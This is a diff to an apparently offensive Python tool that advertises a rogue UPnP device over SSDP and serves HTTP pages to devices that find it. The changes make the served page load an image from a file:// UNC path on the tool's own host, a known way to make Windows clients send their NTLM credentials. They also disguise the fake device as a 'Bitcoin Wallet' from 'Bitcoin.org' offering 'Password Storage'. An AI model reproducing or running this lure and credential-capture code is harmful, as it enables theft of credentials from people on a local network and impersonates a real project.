@@ -17,8 +17,8 @@ class bcolors:
 okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
 noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
 warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
-msearchBox = bcolors.BLUE + '[M-SEARCH] ' + bcolors.ENDC
-httpBox = bcolors.GREEN + '[HTTP REQUEST] ' + bcolors.ENDC
+msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
+httpBox = bcolors.GREEN +   '[HTTP REQUEST] ' + bcolors.ENDC
 
 
 class SSDPListener:
@@ -87,6 +87,7 @@ class SSDPListener:
 
 class DeviceDescriptor(BaseHTTPRequestHandler):
     def do_GET(self):
+        localIp,localPort = self.server.server_address
         if self.path == '/ssdp/device-desc.xml':
             xmlFile = self.buildDeviceXml()
             self.send_response(200)
@@ -103,7 +104,7 @@ class DeviceDescriptor(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write('<img src="file://///192.168.1.243/img.png">'.encode())
+            self.wfile.write('<img src="file://///{}/TMP/img.png">'.format(localIp).encode())
 
     def log_message(self, format, *args):
         address = self.address_string()
@@ -122,13 +123,13 @@ class DeviceDescriptor(BaseHTTPRequestHandler):
     </specVersion>
     <device>
         <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
-        <friendlyName>evilPNP</friendlyName>
-        <manufacturer>eCorp</manufacturer>
-        <manufacturerURL>http://ecorp.co</manufacturerURL>
-        <modelDescription>eMedia Server</modelDescription>
-        <modelName>Black Edition</modelName>
-        <modelNumber>666</modelNumber>
-        <modelURL>http://ecorp.co/model666</modelURL>
+        <friendlyName>Bitcoin Wallet</friendlyName>
+        <manufacturer>Bitcoin.org</manufacturer>
+        <manufacturerURL>http://bitcoin.org</manufacturerURL>
+        <modelDescription>Bitcoin Password Storage</modelDescription>
+        <modelName>Core</modelName>
+        <modelNumber>1337</modelNumber>
+        <modelURL>http://bitcoin.org</modelURL>
         <serialNumber>1337</serialNumber>
         <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
         <serviceList>
